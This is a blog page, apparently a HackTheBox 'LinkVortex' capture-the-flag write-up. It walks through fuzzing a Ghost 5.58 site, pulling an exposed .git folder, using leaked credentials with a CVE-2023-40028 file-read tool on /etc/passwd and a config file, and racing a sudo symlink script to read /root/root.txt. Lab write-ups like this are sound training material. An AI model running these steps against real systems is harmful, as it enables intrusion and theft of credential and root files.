@@ -1,0 +1,140 @@
+<!doctype html><html lang=en-us><head><title>LinkVortex | alfa7i7</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=generator content="Hugo 0.148.0"><link rel=canonical href=/side-quests/htb-linkvortex/><link href=/css/style.min.041e4a3e04c8d069c51f822569eabf716b17b3aec0c9052ef93405591a10b665.css rel=stylesheet><script src=https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js></script><script>mermaid.initialize({startOnLoad:!0})</script></head><body><div class=flexWrapper><header class=headerWrapper><div class=header><div><a class=terminal href=/><span>alfa7i7@empire ~ $</span></a></div><input class=side-menu type=checkbox id=side-menu>
+<label class=hamb for=side-menu><span class=hamb-line></span></label><nav class=headerLinks><ul><li><a href=/posts title>~/blog</a></li><li><a href=/side-quests title>~/side-quests</a></li><li><a href=/whoami title>~/whoami</a></li></ul></nav></div></header><div class=content><main class=main><div class=postWrapper><h1>LinkVortex</h1><section class=postMetadata><dl><dt>tags</dt><dd><span></span>
+<a href=/tags/git/>#Git</a><span></span>
+<a href=/tags/race-condition/>#Race Condition</a><span></span>
+<a href=/tags/cve-2023-40028/>#CVE-2023-40028</a></dd><dt>categories</dt><dd><span></span>
+<a href=/categories/hackthebox/>HackTheBox</a><span></span>
+<a href=/categories/season-7/>Season 7</a></dd><dt>published</dt><dd><time datetime=2025-02-02>February 2, 2025</time></dd><dt>reading time</dt><dd>5 minutes</dd></dl></section><div><h1 id=i-initial-recon>I. Initial Recon</h1><p>Nmap version and default scripts scan:</p><pre tabindex=0><code>22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMHm4UQPajtDjitK8Adg02NRYua67JghmS5m3E+yMq2gwZZJQ/3sIDezw2DVl9trh0gUedrzkqAAG1IMi17G/HA=
+|   256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKLjX3ghPjmmBL2iV1RCQV9QELEU+NF06nbXTqqj4dz
+
+80/tcp open  http    syn-ack ttl 63 Apache httpd
+|_http-server-header: Apache
+| http-robots.txt: 4 disallowed entries 
+|_/ghost/ /p/ /email/ /r/
+|_http-favicon: Unknown favicon MD5: A9C6DBDCDC3AE568F4E0DAD92149A0E3
+|_http-title: BitByBit Hardware
+|_http-generator: Ghost 5.58
+| http-methods: 
+|_  Supported Methods: POST GET HEAD OPTIONS
+</code></pre><p>We have SSH on port 22 and HTTP on port 80. Nmap default scripts returned some
+interesting info: The web app is powered by Ghost (version 5.58) and has multiple
+disallowed entries in the robots file.</p><h1 id=ii-ghost>II. Ghost</h1><p>Ghost is a content management system (CMS). Doing some research, I found an
+authenticated arbitrary file read vulnerability affecting this version (5.58):
+<a href=https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028>CVE-2023-40028</a>.</p><p>Due to its nature (authenticated), this is not useful for now but may be of
+use later on.</p><p>The server redirects to <code>linkvortex.htb</code> upon request. You may need to add
+that domain to your <code>/etc/hosts</code> file.</p><p><img src=Pasted-image-20250131172047.png alt="URL redirection"></p><p>-> The web app:
+<img src=Pasted-image-20250131172346.png alt="BitByBit Hardware"></p><p>-> <code>robots.txt</code> content:</p><pre tabindex=0><code>User-agent: *
+Sitemap: http://linkvortex.htb/sitemap.xml
+Disallow: /ghost/
+Disallow: /p/
+Disallow: /email/
+Disallow: /r/
+</code></pre><p>All entries of <code>robots.txt</code> return 404 errors, except for <code>/ghost/</code> which
+points to the admin login page. We can identify the user <code>admin</code> and verify
+that his email is <code>admin@linkvortex.htb</code> from the login page. Next I tried
+to brute force his password but appearently that was not the right path.</p><p>I moved next to enumerate subdomains of linkvortex.. found <code>dev</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u <span style=color:#e6db74>&#34;http://10.10.11.47&#34;</span> -H <span style=color:#e6db74>&#34;Host: FUZZ.linkvortex.htb&#34;</span> -fs <span style=color:#ae81ff>230</span>
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 25ms]
+</span></span></code></pre></div><p>-> <code>dev.linkvortex.htb</code>:
+<img src=Pasted-image-20250131183434.png alt=dev.linkvortex.htb></p><p>Enumerating directories of that subdomain, I found a git folder:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ ffuf -w /usr/share/wordlists/dirb/common.txt  -u <span style=color:#e6db74>&#34;http://dev.linkvortex.htb/FUZZ&#34;</span>            
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>                        [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 25ms]
+</span></span><span style=display:flex><span>.git/HEAD               [Status: 200, Size: 41, Words: 1, Lines: 2, Duration: 37ms]
+</span></span><span style=display:flex><span>.htaccess               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 38ms]
+</span></span><span style=display:flex><span>.htpasswd               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 24ms]
+</span></span><span style=display:flex><span>.hta                    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 25ms]
+</span></span><span style=display:flex><span>cgi-bin/                [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 28ms]
+</span></span><span style=display:flex><span>index.html              [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 27ms]
+</span></span><span style=display:flex><span>server-status           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 26ms]
+</span></span></code></pre></div><p>The git folder is exposed and can be downloaded entirely by anyone.
+In this case we can recover the whole code base of whatever repo the <code>.git</code>
+belongs to.</p><ol><li>Download the <code>.git</code> folder: <code>wget -r http://dev.linkvortex.htb/.git/</code></li><li>Recover repository: <code>cd dev.linkvortex.htb/.git && git checkout .</code></li></ol><p>As if this is not already bad news for the dev team, I found exposed credentials
+in one of the test files when browsing the repo using vscode. It turned out to
+be the password for <code>admin@linkvortex.htb</code>.</p><p>-> exposed credentials in test file:
+<img src=Pasted-image-20250131190204.png alt=image-alt></p><p>Now that I can access the Ghost dashboard, let&rsquo;s make use of the previously
+mentioned CVE. Reading the <code>/etc/passwd</code> file, I found another user named bob:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ ./CVE-2023-40028 -u admin@linkvortex.htb -p Octopi*********** -h http://linkvortex.htb
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>WELCOME TO THE CVE-2023-40028 SHELL
+</span></span><span style=display:flex><span>Enter the file path to read (or type &#39;exit&#39; to quit): /etc/passwd
+</span></span><span style=display:flex><span>File content:
+</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style=display:flex><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style=display:flex><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style=display:flex><span>...SNIP...
+</span></span><span style=display:flex><span>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span style=display:flex><span>usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+</span></span><span style=display:flex><span>bob:x:1001:1001::/home/bob:/bin/bash
+</span></span><span style=display:flex><span>dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+</span></span><span style=display:flex><span>_laurel:x:999:999::/var/log/laurel:/bin/false
+</span></span></code></pre></div><p>I tried to brute force his SSH password but it went without success.</p><p>Back to vscode, The second file with staged changes is a docker file. It looks
+like the file used to deploy the webapp or to do some initial setup.</p><p>Because we can read arbitrary files on the machine, we can try reading the
+config file (<code>config.production.json</code>) or one of the scripts (<code>entry.sh</code>,
+<code>wait-for-it.sh</code>).</p><p><img src=Pasted-image-20250131203837.png alt=image-alt></p><p>I couldn&rsquo;t read the two scripts, but the config file is here:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;url&#34;</span>: <span style=color:#e6db74>&#34;http://localhost:2368&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;server&#34;</span>: {
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;port&#34;</span>: <span style=color:#ae81ff>2368</span>,
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;host&#34;</span>: <span style=color:#e6db74>&#34;::&#34;</span>
+</span></span><span style=display:flex><span>  },
+</span></span><span style=display:flex><span>  <span style=color:#75715e>// ...SNIP...
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>&#34;mail&#34;</span>: {
+</span></span><span style=display:flex><span>     <span style=color:#f92672>&#34;transport&#34;</span>: <span style=color:#e6db74>&#34;SMTP&#34;</span>,
+</span></span><span style=display:flex><span>     <span style=color:#f92672>&#34;options&#34;</span>: {
+</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;service&#34;</span>: <span style=color:#e6db74>&#34;Google&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;host&#34;</span>: <span style=color:#e6db74>&#34;linkvortex.htb&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;port&#34;</span>: <span style=color:#ae81ff>587</span>,
+</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;auth&#34;</span>: {
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;user&#34;</span>: <span style=color:#e6db74>&#34;bob@linkvortex.htb&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;pass&#34;</span>: <span style=color:#e6db74>&#34;fibber***************&#34;</span>
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Here we go, SSH credentials to bob account on the machine.</p><h1 id=iii-race>III. Race</h1><p>Performing basic enumeration, I found that bob can run a bash script with root
+privileges.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>bob@linkvortex:~$ sudo -l
+</span></span><span style=display:flex><span>Matching Defaults entries for bob on linkvortex:
+</span></span><span style=display:flex><span>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>User bob may run the following commands on linkvortex:
+</span></span><span style=display:flex><span>    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
+</span></span></code></pre></div><p>-> <code>clean_symlink.sh</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>QUAR_DIR<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/var/quarantined&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> -z $CHECK_CONTENT <span style=color:#f92672>]</span>;<span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>  CHECK_CONTENT<span style=color:#f92672>=</span>false
+</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>LINK<span style=color:#f92672>=</span>$1
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ! <span style=color:#f92672>[[</span> <span style=color:#e6db74>&#34;</span>$LINK<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>=</span>~ <span style=color:#ae81ff>\.</span>png$ <span style=color:#f92672>]]</span>; <span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>  /usr/bin/echo <span style=color:#e6db74>&#34;! First argument must be a png file !&#34;</span>
+</span></span><span style=display:flex><span>  exit <span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> /usr/bin/sudo /usr/bin/test -L $LINK;<span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>  LINK_NAME<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>/usr/bin/basename $LINK<span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>  LINK_TARGET<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>/usr/bin/readlink $LINK<span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> /usr/bin/echo <span style=color:#e6db74>&#34;</span>$LINK_TARGET<span style=color:#e6db74>&#34;</span> | /usr/bin/grep -Eq <span style=color:#e6db74>&#39;(etc|root)&#39;</span>;<span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>    /usr/bin/echo <span style=color:#e6db74>&#34;! Trying to read critical files, removing link [ </span>$LINK<span style=color:#e6db74> ] !&#34;</span>
+</span></span><span style=display:flex><span>    /usr/bin/unlink $LINK
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>    /usr/bin/echo <span style=color:#e6db74>&#34;Link found [ </span>$LINK<span style=color:#e6db74> ] , moving it to quarantine&#34;</span>
+</span></span><span style=display:flex><span>    /usr/bin/mv $LINK $QUAR_DIR/
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> $CHECK_CONTENT;<span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>      /usr/bin/echo <span style=color:#e6db74>&#34;Content:&#34;</span>
+</span></span><span style=display:flex><span>      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2&gt;/dev/null
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
+</span></span></code></pre></div><p>Noticed the flaw? The script checks if <code>$LINK</code> is a symlink and takes some time
+to move it to the quarantine directory. Because the script does not verify if the
+link changes before execution, we can exploit a race condition to get root.txt
+(or any file on the machine, e.g. <code>/etc/shadow</code> or root&rsquo;s private SSH key):</p><ol><li>make sure <code>$CHECK_CONTENT</code> is set so the content of the file will be printed on standard output after quaratining the symbolic link</li><li>Change sleep period based on the actual load on the cpu of the machine.</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>bob@linkvortex:~$ ln -sf /home/bob/user.txt target.png
+</span></span><span style=display:flex><span>bob@linkvortex:~$ (CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh *.png) &amp; (sleep 0.06 &amp;&amp; ln -sf /root/root.txt target.png) 
+</span></span></code></pre></div></div></div></main></div><footer class=footer><span>© 2025 alfa7i7, Built with
+<a href=https://gohugo.io class=footerLink>Hugo</a> and
+<a href=https://github.com/LordMathis/hugo-theme-nightfall class=footerLink>Nightfall</a> theme</span></footer></div></body></html>
